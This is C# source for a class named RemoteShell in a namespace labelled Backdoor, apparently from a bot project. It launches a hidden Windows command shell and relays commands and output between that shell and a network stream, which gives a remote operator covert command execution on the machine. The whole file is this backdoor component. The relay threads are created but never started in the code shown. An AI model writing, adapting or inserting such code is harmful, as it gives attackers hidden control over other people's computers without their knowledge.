using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace MoBot.Scripts.Backdoor
{
    internal class RemoteShell : IDisposable
    {
        private readonly StreamReader input;
        private readonly StreamWriter output;

        private readonly StreamReader fromShell;
        private readonly StreamWriter toShell;

        private readonly Process shell;

        private readonly Thread shellThread;
        private readonly Thread remoteThread;

        public RemoteShell(Stream stream)
        {
            input = new StreamReader(stream);
            output = new StreamWriter(stream) { AutoFlush = true };

            var processStart = new ProcessStartInfo("cmd")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardInput = true,
                RedirectStandardOutput = true
            };

            shell = new Process { StartInfo = processStart };
            shell.Start();

            fromShell = shell.StandardOutput;
            toShell = shell.StandardInput;

            shellThread = new Thread(GetShellInput);
            remoteThread = new Thread(GetRemoteInput);
        }

        private void GetShellInput()
        {
            try
            {
                string buff;
                while ((buff = fromShell.ReadLine()) != null)
                {
                    output.WriteLine(buff);
                }
            }
            catch (Exception)
            {
                // ignored
            }
        }

        private void GetRemoteInput()
        {
            try
            {
                string buff;
                while ((buff = input.ReadLine()) != null)
                {
                    toShell.WriteLine(buff);
                }
            }
            catch (Exception)
            {
                // ignored
            }
        }

        public void Dispose()
        {
            input?.Dispose();
            output?.Dispose();

            shell?.Close();
            shell?.Dispose();

            toShell?.Dispose();
            fromShell?.Dispose();

            shellThread.Abort();
            remoteThread.Abort();
        }
    }
}